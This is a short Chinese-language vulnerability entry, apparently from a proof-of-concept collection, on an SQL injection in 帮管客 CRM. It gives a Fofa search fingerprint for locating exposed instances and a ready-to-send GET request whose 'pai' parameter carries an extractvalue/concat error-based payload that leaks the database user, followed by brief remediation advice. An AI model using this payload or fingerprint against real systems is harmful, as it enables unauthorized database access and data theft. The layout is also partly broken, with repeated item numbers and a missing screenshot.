# 帮管客CRMSQL注入

- **系统**：帮管客CRM　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="帮管客-CRM"`
- **请求**：`GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+user%28%29),0x7e))%23&xu=desc HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="帮管客-CRM"
1. 界面如下
1. POC
Host: your-ip
```

**其他**
- 修复建议: 1、请联系厂商进行修复。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。